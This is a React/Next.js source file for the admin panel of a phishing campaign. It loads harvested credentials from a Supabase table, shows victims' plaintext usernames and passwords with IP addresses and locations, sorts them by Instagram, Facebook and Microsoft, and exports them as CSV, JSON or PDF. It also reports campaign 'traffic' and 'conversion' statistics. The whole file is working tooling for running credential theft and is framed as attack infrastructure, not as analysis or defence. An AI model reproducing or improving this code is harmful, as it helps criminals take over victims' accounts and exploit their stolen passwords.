import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import { useRouter } from 'next/router';
import Head from 'next/head';
import styles from '../styles/Admin.module.css';

// Initialize Supabase client
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseAnonKey);

export default function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [credentials, setCredentials] = useState([]);
  const [stats, setStats] = useState({
    totalEntries: 0,
    instagramEntries: 0,
    facebookEntries: 0,
    countries: {},
    continents: {}
  });
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('all');
  const [darkMode, setDarkMode] = useState(false);
  const [platformCounts, setPlatformCounts] = useState({});
  
  const router = useRouter();
  
  // Handle login
  const handleLogin = (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    // Simple hardcoded password for testing
    const correctPassword = "admin123"; 
    
    if (password === correctPassword) {
      setIsAuthenticated(true);
      localStorage.setItem('phishingAdminAuth', 'true');
      fetchCredentials();
    } else {
      setError('Invalid password');
    }
    setLoading(false);
  };
  
  // Check if already authenticated
  useEffect(() => {
    const auth = localStorage.getItem('phishingAdminAuth');
    if (auth === 'true') {
      setIsAuthenticated(true);
      fetchCredentials();
    }
    
    // Check for dark mode preference
    const prefersDark = localStorage.getItem('darkMode') === 'true';
    setDarkMode(prefersDark);
    if (prefersDark) {
      document.body.classList.add('dark-mode');
    }
  }, []);
  
  // Toggle dark mode
  const toggleDarkMode = () => {
    setDarkMode(!darkMode);
    localStorage.setItem('darkMode', !darkMode);
    document.body.classList.toggle('dark-mode');
  };
  
  // Fetch credentials from database
  const fetchCredentials = async () => {
    setLoading(true);
    
    try {
      console.log('Fetching credentials from Supabase...');
      
      // Skip the API endpoint and use direct Supabase connection first
      const { data, error } = await supabase
        .from('users')
        .select('*')
        .order('login_time', { ascending: false });
        
      if (error) {
        console.error('Supabase error:', error);
        
        // Fall back to API if direct connection fails
        try {
          const response = await fetch('/api/direct-query?full=true');
          const result = await response.json();
          
          if (result.success && result.data) {
            console.log('Successfully fetched data via API:', result.count + ' records');
            setCredentials(result.data || []);
            calculateStats(result.data || []);
            setLoading(false);
            return;
          } else {
            console.warn('API call succeeded but no data returned:', result);
            throw new Error('No data returned from API');
          }
        } catch (apiError) {
          console.error('Error fetching via API:', apiError);
          throw error; // Rethrow the original Supabase error
        }
      }
      
      console.log('Credentials received directly:', data ? data.length : 0);
      setCredentials(data || []);
      calculateStats(data || []);
    } catch (error) {
      console.error('Error fetching credentials:', error);
      setError('Failed to load data: ' + error.message);
    } finally {
      setLoading(false);
    }
  };
  
  // Calculate statistics from credential data
  const calculateStats = (data) => {
    const stats = {
      totalEntries: data.length,
      instagramEntries: data.filter(item => 
        (item.username && item.username.includes('(IG)')) || 
        (item.platform && item.platform.toLowerCase().includes('instagram'))
      ).length,
      facebookEntries: data.filter(item => 
        (item.username && (item.username.includes('(FB)') || item.username.includes('(FB Mobile)'))) ||
        (item.platform && ['facebook', 'facebook-mobile', 'fb'].includes(item.platform.toLowerCase()))
      ).length,
      countries: {},
      continents: {}
    };
    
    // Count by country and continent
    data.forEach(item => {
      // Count countries
      if (item.country) {
        stats.countries[item.country] = (stats.countries[item.country] || 0) + 1;
      }
      
      // Count continents
      if (item.continent) {
        stats.continents[item.continent] = (stats.continents[item.continent] || 0) + 1;
      }
    });
    
    setStats(stats);
  };
  
  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem('phishingAdminAuth');
    setIsAuthenticated(false);
  };
  
  // Filter credentials
  const filterCredentials = () => {
    if (!credentials) return [];
    
    let filtered = [...credentials];
    
    // Filter by platform
    if (filter === 'instagram') {
      filtered = filtered.filter(cred => 
        (cred.username && cred.username.includes('(IG)')) || 
        (cred.platform && cred.platform.toLowerCase().includes('instagram'))
      );
    } else if (filter === 'facebook') {
      filtered = filtered.filter(cred => 
        (cred.username && (cred.username.includes('(FB)') || cred.username.includes('(FB Mobile)'))) ||
        (cred.platform && ['facebook', 'facebook-mobile', 'fb'].includes(cred.platform.toLowerCase()))
      );
    }
    
    // Apply search term if present
    if (searchTerm) {
      filtered = filtered.filter(cred => 
        (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase()))
      );
    }
    
    return filtered;
  };
  
  // Export credentials as CSV
  const exportCSV = () => {
    let csvContent = "data:text/csv;charset=utf-8,";
    csvContent += "Username,Password,Country,City,Continent,IP,Date\n";
    
    credentials.forEach(cred => {
      const row = [
        `"${cred.username}"`,
        `"${cred.password}"`,
        `"${cred.country || ''}"`,
        `"${cred.city || ''}"`,
        `"${cred.continent || ''}"`,
        `"${cred.ip_address || ''}"`,
        `"${new Date(cred.login_time).toLocaleString()}"`
      ].join(',');
      csvContent += row + "\n";
    });
    
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "credentials.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  // Add these export functions
  const exportJSON = () => {
    const dataStr = JSON.stringify(filterCredentials(), null, 2);
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
    
    const exportFileDefaultName = `credentials-${new Date().toISOString().slice(0,10)}.json`;
    
    let linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
  };
  
  const exportPDF = async () => {
    // Using a CDN-loaded library for this example
    if (!window.jsPDF) {
      await loadJsPDF();
    }
    
    const doc = new window.jsPDF();
    
    // Add title
    doc.setFontSize(18);
    doc.text('Credentials Report', 14, 22);
    
    // Set up the table
    const headers = [['Username', 'Password', 'Location', 'IP', 'Date']];
    
    const data = filterCredentials().map(cred => [
      cred.username || '',
      cred.password || '',
      `${cred.city || ''}, ${cred.country || ''}`,
      cred.ip_address || '',
      new Date(cred.login_time).toLocaleString()
    ]);
    
    doc.autoTable({
      startY: 30,
      head: headers,
      body: data,
    });
    
    doc.save(`credentials-${new Date().toISOString().slice(0,10)}.pdf`);
  };
  
  // Helper to load jsPDF dynamically
  const loadJsPDF = () => {
    return new Promise((resolve) => {
      const script = document.createElement('script');
      script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
      script.onload = resolve;
      document.head.appendChild(script);
      
      const autoTableScript = document.createElement('script');
      autoTableScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.25/jspdf.plugin.autotable.min.js';
      document.head.appendChild(autoTableScript);
    });
  };
  
  // Fix the platform display section to ensure proper counting
  useEffect(() => {
    async function fetchData() {
      try {
        const { data, error } = await supabase
          .from('users')
          .select('*')
          .order('created_at', { ascending: false });
          
        if (error) throw error;
        
        setPlatformCounts(data.reduce((acc, user) => {
          const platform = user.platform || '';
          if (platform.includes('facebook') || platform === 'fb' || platform === 'facebook-mobile') {
            acc['facebook'] = (acc['facebook'] || 0) + 1;
          } else if (platform.includes('instagram')) {
            acc['instagram'] = (acc['instagram'] || 0) + 1;
          } else if (platform.includes('hotmail') || platform.includes('MS')) {
            acc['microsoft'] = (acc['microsoft'] || 0) + 1;
          }
          return acc;
        }, {}));
        setLoading(false);
      } catch (error) {
        console.error('Error fetching data:', error);
        setError(error.message);
        setLoading(false);
      }
    }
    
    fetchData();
  }, [supabase]);
  
  // Fix the filterPlatformData function
  function filterPlatformData(platform) {
    if (!credentials) return [];
    
    if (platform === 'facebook') {
      return credentials.filter(user => 
        user.platform === 'facebook' || 
        user.platform === 'facebook-mobile' || 
        (user.username && (user.username.includes('(FB)') || user.username.includes('(FB Mobile)')))
      );
    }
    
    if (platform === 'instagram') {
      return credentials.filter(user =>
        user.platform === 'instagram' ||
        (user.username && user.username.includes('(IG)'))
      );
    }
    
    return credentials.filter(user => user.platform === platform);
  }
  
  // Create a component for insights
  const DashboardInsights = ({ stats }) => {
    return (
      <div className={styles.insightsContainer}>
        <div className={styles.insightCard}>
          <div className={styles.insightIcon}>
            <i className="fas fa-chart-line"></i>
          </div>
          <div className={styles.insightContent}>
            <h3>Activity Rate</h3>
            <p className={styles.insightValue}>
              {stats.totalEntries > 10 ? 'High' : 'Low'}
            </p>
            <p className={styles.insightText}>
              {stats.totalEntries > 10 
                ? 'Your phishing campaign is getting good traffic.'
                : 'Your campaign needs more traffic.'}
            </p>
          </div>
        </div>
        
        <div className={styles.insightCard}>
          <div className={styles.insightIcon}>
            <i className="fas fa-globe-americas"></i>
          </div>
          <div className={styles.insightContent}>
            <h3>Top Region</h3>
            <p className={styles.insightValue}>
              {Object.entries(stats.countries).sort((a, b) => b[1] - a[1])[0]?.[0] || 'N/A'}
            </p>
            <p className={styles.insightText}>
              Most of your entries are from this region.
            </p>
          </div>
        </div>
        
        <div className={styles.insightCard}>
          <div className={styles.insightIcon}>
            <i className="fas fa-trophy"></i>
          </div>
          <div className={styles.insightContent}>
            <h3>Top Platform</h3>
            <p className={styles.insightValue}>
              {stats.instagramEntries > stats.facebookEntries ? 'Instagram' : 'Facebook'}
            </p>
            <p className={styles.insightText}>
              This platform has the highest conversion rate.
            </p>
          </div>
        </div>
      </div>
    );
  };
  
  // Add this component
  const ActivityTimeline = ({ entries }) => {
    const timelineEntries = entries.slice(0, 8); // Latest 8 entries
    
    return (
      <div className={styles.timelineContainer}>
        <h3><i className="fas fa-history"></i> Recent Activity</h3>
        <div className={styles.timeline}>
          {timelineEntries.map((entry, index) => (
            <div key={entry.id || index} className={styles.timelineItem} style={{ animationDelay: `${index * 0.1}s` }}>
              <div className={styles.timelineDot}>
                {entry.platform?.includes('facebook') || entry.username?.includes('(FB)') ? (
                  <i className="fab fa-facebook"></i>
                ) : entry.platform?.includes('instagram') || entry.username?.includes('(IG)') ? (
                  <i className="fab fa-instagram"></i>
                ) : (
                  <i className="fas fa-user"></i>
                )}
              </div>
              <div className={styles.timelineContent}>
                <h4>{entry.username || 'Unknown user'}</h4>
                <p>From {entry.country || 'unknown location'} using IP {entry.ip_address || 'unknown'}</p>
                <span className={styles.timelineDate}>
                  {new Date(entry.login_time || entry.created_at).toLocaleString()}
                </span>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  };
  
  return (
    <>
      <Head>
        <title>Admin Dashboard</title>
        <meta name="robots" content="noindex, nofollow" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      </Head>
      
      <div className={`admin-container ${darkMode ? 'dark-mode' : ''}`}>
        {!isAuthenticated ? (
          <div className="login-container">
            <div className="login-box">
              <h1><i className="fas fa-lock"></i> Admin Login</h1>
              <form onSubmit={handleLogin}>
                <div className="input-group">
                  <label htmlFor="password">Password</label>
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>
                {error && <div className="error-message">{error}</div>}
                <button type="submit" disabled={loading}>
                  {loading ? 'Loading...' : 'Login'}
                </button>
              </form>
              {!isAuthenticated && (
                <button 
                  type="button" 
                  onClick={() => {
                    localStorage.removeItem('phishingAdminAuth');
                    window.location.reload();
                  }} 
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#999',
                    textDecoration: 'underline',
                    cursor: 'pointer',
                    fontSize: '12px',
                    marginTop: '10px'
                  }}
                >
                  Reset Login State
                </button>
              )}
            </div>
          </div>
        ) : (
          <div className="dashboard">
            <header className="dashboard-header">
              <h1><i className="fas fa-chart-line"></i> Admin Dashboard</h1>
              <div className="header-actions">
                <button onClick={toggleDarkMode} className="icon-button">
                  <i className={`fas fa-${darkMode ? 'sun' : 'moon'}`}></i>
                </button>
                <button onClick={handleLogout} className="logout-button">
                  <i className="fas fa-sign-out-alt"></i> Logout
                </button>
              </div>
            </header>
            
            {loading ? (
              <div className="loading">
                <i className="fas fa-spinner fa-spin"></i> Loading data...
              </div>
            ) : (
              <>
                <div className="stats-overview">
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-users"></i></div>
                    <div className="stat-content">
                      <h3>Total Entries</h3>
                      <p className="stat-number">{stats.totalEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon instagram"><i className="fab fa-instagram"></i></div>
                    <div className="stat-content">
                      <h3>Instagram</h3>
                      <p className="stat-number">{stats.instagramEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="platform-icon" style={{ 
                      display: 'flex', 
                      alignItems: 'center', 
                      justifyContent: 'center'
                    }}>
                      <div style={{ 
                        width: '36px', 
                        height: '36px', 
                        borderRadius: '50%', 
                        backgroundColor: '#1877f2',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        overflow: 'hidden'
                      }}>
                        <img 
                          src="/assets/facebook.svg" 
                          alt="Facebook" 
                          width="36"
                          height="36"
                          style={{
                            maxWidth: '100%',
                            maxHeight: '100%'
                          }}
                        />
                      </div>
                    </div>
                    <div className="stat-content">
                      <h3>Facebook</h3>
                      <p className="stat-number">{stats.facebookEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-globe"></i></div>
                    <div className="stat-content">
                      <h3>Countries</h3>
                      <p className="stat-number">{Object.keys(stats.countries).length}</p>
                    </div>
                  </div>
                </div>
                
                <div className="data-container">
                  <div className="data-header">
                    <h2><i className="fas fa-table"></i> Collected Credentials</h2>
                    
                    <div className="tabs">
                      <button 
                        className={filter === 'all' ? 'tab-active' : ''}
                        onClick={() => setFilter('all')}
                      >
                        All Records
                      </button>
                      <button 
                        className={filter === 'instagram' ? 'tab-active' : ''}
                        onClick={() => setFilter('instagram')}
                      >
                        Instagram <span className="badge">{stats.instagramEntries}</span>
                      </button>
                      <button 
                        className={filter === 'facebook' ? 'tab-active' : ''}
                        onClick={() => setFilter('facebook')}
                      >
                        Facebook <span className="badge">{stats.facebookEntries}</span>
                      </button>
                    </div>
                    
                    <div className="data-actions">
                      <div className="search">
                        <i className="fas fa-search"></i>
                        <input 
                          type="text" 
                          placeholder="Search..." 
                          value={searchTerm}
                          onChange={(e) => setSearchTerm(e.target.value)}
                        />
                      </div>
                      
                      <div className={styles.exportOptions}>
                        <button onClick={exportCSV} className={styles.exportButton}>
                          <i className="fas fa-file-csv"></i> CSV
                        </button>
                        <button onClick={exportJSON} className={styles.exportButton}>
                          <i className="fas fa-file-code"></i> JSON
                        </button>
                        <button onClick={exportPDF} className={styles.exportButton}>
                          <i className="fas fa-file-pdf"></i> PDF
                        </button>
                      </div>
                    </div>
                  </div>
                  
                  <div className="data-table-container">
                    <table className="data-table">
                      <thead>
                        <tr>
                          <th>Username</th>
                          <th>Password</th>
                          <th>Location</th>
                          <th>IP Address</th>
                          <th>Date/Time</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filterCredentials().map((cred, index) => (
                          <tr key={cred.id || index} className={
                            (cred.platform && cred.platform.includes('facebook')) || (cred.username && cred.username.includes('(FB)')) 
                              ? 'facebook-row' 
                              : (cred.platform && cred.platform.includes('instagram')) || (cred.username && cred.username.includes('(IG)'))
                              ? 'instagram-row'
                              : ''
                          }>
                            <td>
                              {(cred.platform && cred.platform.includes('facebook')) || (cred.username && cred.username.includes('(FB)')) ? (
                                <><i className="fab fa-facebook"></i> </>
                              ) : (cred.platform && cred.platform.includes('instagram')) || (cred.username && cred.username.includes('(IG)')) ? (
                                <><i className="fab fa-instagram"></i> </>
                              ) : null}
                              {cred.username || '(No username)'}
                            </td>
                            <td>{cred.password || '(No password)'}</td>
                            <td>
                              {cred.city && cred.country ? (
                                <>
                                  <i className="fas fa-map-marker-alt"></i> {cred.city}, {cred.country}
                                  {cred.continent && <div className="continent"><i className="fas fa-globe"></i> {cred.continent}</div>}
                                </>
                              ) : (
                                'Unknown'
                              )}
                            </td>
                            <td>{cred.ip_address || 'Unknown'}</td>
                            <td>{cred.login_time ? new Date(cred.login_time).toLocaleString() : 'Unknown'}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
                
                <DashboardInsights stats={stats} />
                <ActivityTimeline entries={credentials} />
              </>
            )}
          </div>
        )}
      </div>
      
      <style jsx global>{`
        :root {
          --primary: #3f51b5;
          --primary-light: #757de8;
          --primary-dark: #002984;
          --secondary: #ff4081;
          --success: #4caf50;
          --warning: #ff9800;
          --danger: #f44336;
          --info: #2196f3;
          --instagram: #E1306C;
          --microsoft: #00a4ef;
          --light: #f8f9fa;
          --dark: #212529;
          --gray: #6c757d;
          --dark-bg: #1a1a1a;
          --dark-card: #2d2d2d;
          --dark-text: #f0f0f0;
        }
        
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        body {
          font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          line-height: 1.6;
          color: #333;
          background-color: #f5f7fa;
          transition: background-color 0.3s, color 0.3s;
        }
        
        body.dark-mode {
          background-color: var(--dark-bg);
          color: var(--dark-text);
        }
        
        .admin-container {
          min-height: 100vh;
          width: 100%;
        }
        
        .login-container {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, var(--primary-dark), var(--primary));
        }
        
        .login-box {
          background-color: white;
          padding: 2rem;
          border-radius: 8px;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
          width: 100%;
          max-width: 400px;
        }
        
        .dark-mode .login-box {
          background-color: var(--dark-card);
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        
        .login-box h1 {
          margin-bottom: 1.5rem;
          text-align: center;
          color: var(--primary);
        }
        
        .dark-mode .login-box h1 {
          color: var(--primary-light);
        }
        
        .input-group {
          margin-bottom: 1.5rem;
        }
        
        .input-group label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 500;
        }
        
        input[type="password"] {
          width: 100%;
          padding: 0.75rem;
          border: 1px solid #ddd;
          border-radius: 4px;
          font-size: 1rem;
          transition: border-color 0.3s;
        }
        
        .dark-mode input[type="password"] {
          background-color: #333;
          border-color: #555;
          color: white;
        }
        
        input[type="password"]:focus {
          border-color: var(--primary);
          outline: none;
          box-shadow: 0 0 0 2px rgba(63, 81, 181, 0.2);
        }
        
        .dark-mode input[type="password"]:focus {
          box-shadow: 0 0 0 2px rgba(117, 125, 232, 0.3);
        }
        
        button {
          width: 100%;
          padding: 0.75rem;
          background-color: var(--primary);
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 1rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.3s;
        }
        
        button:hover {
          background-color: var(--primary-dark);
        }
        
        button:disabled {
          background-color: var(--gray);
          cursor: not-allowed;
        }
        
        .error-message {
          color: var(--danger);
          margin-bottom: 1rem;
          font-size: 0.875rem;
        }
        
        /* Dashboard Styles */
        .dashboard {
          min-height: 100vh;
          padding: 2rem;
          transition: background-color 0.3s, color 0.3s;
        }
        
        .dark-mode .dashboard {
          background-color: var(--dark-bg);
          color: var(--dark-text);
        }
        
        .dashboard-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 2rem;
          padding-bottom: 1rem;
          border-bottom: 1px solid #eee;
        }
        
        .dark-mode .dashboard-header {
          border-bottom-color: #444;
        }
        
        .dashboard-header h1 {
          color: var(--primary);
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        
        .dark-mode .dashboard-header h1 {
          color: var(--primary-light);
        }
        
        .header-actions {
          display: flex;
          gap: 1rem;
        }
        
        .icon-button {
          width: auto;
          padding: 0.5rem;
          background-color: transparent;
          color: var(--gray);
          border: 1px solid #eee;
          border-radius: 50%;
          height: 40px;
          width: 40px;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: all 0.3s;
        }
        
        .dark-mode .icon-button {
          color: var(--light);
          border-color: #444;
        }
        
        .icon-button:hover {
          background-color: #f5f5f5;
          color: var(--primary);
        }
        
        .dark-mode .icon-button:hover {
          background-color: #333;
          color: var(--primary-light);
        }
        
        .logout-button {
          width: auto;
          display: flex;
          align-items: center;
          gap: 0.5rem;
          padding: 0.5rem 1rem;
          background-color: white;
          color: var(--gray);
          border: 1px solid #eee;
          border-radius: 4px;
          transition: all 0.3s;
        }
        
        .dark-mode .logout-button {
          background-color: #333;
          color: var(--light);
          border-color: #444;
        }
        
        .logout-button:hover {
          background-color: #f5f5f5;
          color: var(--danger);
        }
        
        .dark-mode .logout-button:hover {
          background-color: #3a3a3a;
          color: var(--danger);
        }
        
        .loading {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 200px;
          font-size: 1.2rem;
          color: var(--gray);
        }
        
        .loading i {
          margin-right: 0.5rem;
        }
        
        /* Stats Cards */
        .stats-overview {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 1.5rem;
          margin-bottom: 2rem;
        }
        
        .stat-card {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
          display: flex;
          align-items: center;
          transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .dark-mode .stat-card {
          background-color: var(--dark-card);
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .stat-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
        }
        
        .dark-mode .stat-card:hover {
          box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
        }
        
        .stat-icon {
          font-size: 2rem;
          width: 60px;
          height: 60px;
          border-radius: 50%;
          background-color: #f0f4ff;
          color: var(--primary);
          display: flex;
          align-items: center;
          justify-content: center;
          margin-right: 1rem;
        }
        
        .dark-mode .stat-icon {
          background-color: #2a2a5a;
        }
        
        .stat-icon.instagram {
          background-color: #fcebf1;
          color: var(--instagram);
        }
        
        .dark-mode .stat-icon.instagram {
          background-color: #5a2a3a;
        }
        
        .stat-icon.facebook {
          background-color: #e6f7ff;
          color: var(--microsoft);
        }
        
        .dark-mode .stat-icon.facebook {
          background-color: #1a3a4a;
        }
        
        .stat-content h3 {
          font-size: 0.875rem;
          color: var(--gray);
          margin-bottom: 0.25rem;
        }
        
        .stat-number {
          font-size: 1.75rem;
          font-weight: 600;
          color: var(--dark);
        }
        
        .dark-mode .stat-number {
          color: var(--light);
        }
        
        /* Data Section */
        .data-container {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
        }
        
        .dark-mode .data-container {
          background-color: var(--dark-card);
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .data-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 1.5rem;
          flex-wrap: wrap;
          gap: 1rem;
        }
        
        .data-header h2 {
          color: var(--primary);
        }
        
        .dark-mode .data-header h2 {
          color: var(--primary-light);
        }
        
        .data-actions {
          display: flex;
          align-items: center;
          gap: 1rem;
          flex-wrap: wrap;
        }
        
        .search {
          position: relative;
        }
        
        .search input {
          padding: 0.5rem 1rem 0.5rem 2.5rem;
          border: 1px solid #eee;
          border-radius: 4px;
          width: 250px;
          font-size: 0.875rem;
        }
        
        .dark-mode .search input {
          background-color: #333;
          border-color: #444;
          color: white;
        }
        
        .search i {
          position: absolute;
          left: 0.75rem;
          top: 50%;
          transform: translateY(-50%);
          color: var(--gray);
        }
        
        .export-button {
          width: auto;
          padding: 0.5rem 1rem;
          background-color: var(--success);
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.875rem;
        }
        
        .export-button:hover {
          background-color: #3d8b40;
        }
        
        .data-table-container {
          overflow-x: auto;
        }
        
        .data-table {
          width: 100%;
          border-collapse: collapse;
          font-size: 0.875rem;
        }
        
        .data-table th {
          text-align: left;
          padding: 0.75rem;
          background-color: #f8f9fa;
          border-bottom: 2px solid #eee;
          font-weight: 600;
          color: var(--gray);
        }
        
        .dark-mode .data-table th {
          background-color: #2a2a2a;
          border-bottom-color: #444;
          color: #bbb;
        }
        
        .data-table td {
          padding: 0.75rem;
          border-bottom: 1px solid #eee;
          vertical-align: middle;
        }
        
        .dark-mode .data-table td {
          border-bottom-color: #444;
        }
        
        .data-table tr:last-child td {
          border-bottom: none;
        }
        
        .data-table tr:hover td {
          background-color: #f5f7fa;
        }
        
        .dark-mode .data-table tr:hover td {
          background-color: #383838;
        }
        
        .instagram-row td:first-child {
          border-left: 3px solid var(--instagram);
        }
        
        .facebook-row td:first-child {
          border-left: 3px solid var(--microsoft);
        }
        
        .no-data {
          text-align: center;
          color: var(--gray);
          padding: 2rem !important;
        }
        
        .continent {
          font-size: 0.75rem;
          color: var(--gray);
          margin-top: 0.25rem;
        }
        
        /* Mobile Responsive Adjustments */
        @media (max-width: 768px) {
          .dashboard {
            padding: 1rem;
          }
          
          .dashboard-header {
            flex-direction: column;
            align-items: flex-start;
            gap: 1rem;
          }
          
          .header-actions {
            width: 100%;
            justify-content: space-between;
          }
          
          .stats-overview {
            grid-template-columns: 1fr;
          }
          
          .data-header {
            flex-direction: column;
            align-items: flex-start;
          }
          
          .data-actions {
            width: 100%;
            justify-content: space-between;
          }
          
          .search input {
            width: 100%;
          }
        }
        
        .reset-button {
          background: none;
          border: none;
          color: #999;
          text-decoration: underline;
          cursor: pointer;
          font-size: 12px;
          margin-top: 10px;
        }
        
        .tabs {
          display: flex;
          margin-bottom: 1rem;
          border-bottom: 1px solid #eee;
          width: 100%;
        }
        
        .dark-mode .tabs {
          border-bottom-color: #444;
        }
        
        .tabs button {
          background: none;
          border: none;
          padding: 0.5rem 1rem;
          margin-right: 1rem;
          font-size: 0.875rem;
          color: var(--gray);
          border-bottom: 2px solid transparent;
          cursor: pointer;
        }
        
        .tabs button:hover {
          color: var(--primary);
        }
        
        .tab-active {
          color: var(--primary) !important;
          border-bottom: 2px solid var(--primary) !important;
          font-weight: 500;
        }
        
        .badge {
          display: inline-block;
          background-color: #eee;
          border-radius: 12px;
          padding: 2px 6px;
          font-size: 0.75rem;
          margin-left: 5px;
        }
        
        .dark-mode .badge {
          background-color: #333;
        }
        
        /* Style for Facebook logo in admin page */
        .facebook-logo-container {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 32px;
          height: 32px;
          border-radius: 50%;
          background-color: #1877f2;
          overflow: hidden;
        }
        
        .facebook-logo-container img {
          width: 32px;
          height: 32px;
        }
        
        .insightsContainer {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
          gap: 20px;
          margin: 20px 0;
        }
        
        .insightCard {
          background: linear-gradient(135deg, #6e8efb, #a777e3);
          border-radius: 12px;
          padding: 20px;
          color: white;
          display: flex;
          align-items: center;
          box-shadow: 0 10px 20px rgba(0,0,0,0.15);
          transition: transform 0.3s ease, box-shadow 0.3s ease;
          animation: fadeIn 0.6s ease-out;
        }
        
        .insightCard:hover {
          transform: translateY(-5px);
          box-shadow: 0 15px 30px rgba(0,0,0,0.2);
        }
        
        .insightIcon {
          font-size: 40px;
          margin-right: 20px;
          width: 60px;
          height: 60px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .insightContent h3 {
          margin: 0 0 5px 0;
          font-size: 18px;
          font-weight: 500;
        }
        
        .insightValue {
          font-size: 26px;
          font-weight: 700;
          margin: 0 0 5px 0;
        }
        
        .insightText {
          font-size: 14px;
          margin: 0;
          opacity: 0.9;
        }
        
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        
        body.dark-mode .insightCard {
          background: linear-gradient(135deg, #38408c, #8a33cc);
        }
        
        .timelineContainer {
          background-color: white;
          border-radius: 12px;
          padding: 20px;
          margin: 20px 0;
          box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        
        body.dark-mode .timelineContainer {
          background-color: #1e1e1e;
        }
        
        .timeline {
          position: relative;
          padding-left: 30px;
          margin-top: 15px;
        }
        
        .timeline:before {
          content: '';
          position: absolute;
          left: 10px;
          top: 5px;
          bottom: 5px;
          width: 2px;
          background: #e0e0e0;
        }
        
        body.dark-mode .timeline:before {
          background: #444;
        }
        
        .timelineItem {
          position: relative;
          margin-bottom: 25px;
          animation: slideIn 0.5s ease-out forwards;
          opacity: 0;
          transform: translateX(-10px);
        }
        
        @keyframes slideIn {
          to { opacity: 1; transform: translateX(0); }
        }
        
        .timelineDot {
          position: absolute;
          left: -30px;
          width: 30px;
          height: 30px;
          border-radius: 50%;
          background: #4a6fb1;
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          z-index: 1;
        }
        
        .timelineContent {
          background-color: #f9f9f9;
          padding: 15px;
          border-radius: 8px;
          box-shadow: 0 2px 5px rgba(0,0,0,0.08);
        }
        
        body.dark-mode .timelineContent {
          background-color: #2c2c2c;
        }
        
        .timelineContent h4 {
          margin: 0 0 5px 0;
          font-weight: 600;
        }
        
        .timelineContent p {
          margin: 0 0 5px 0;
          font-size: 14px;
        }
        
        .timelineDate {
          font-size: 12px;
          color: #777;
          display: block;
        }
        
        body.dark-mode .timelineDate {
          color: #aaa;
        }
      `}</style>
    </>
  );
} 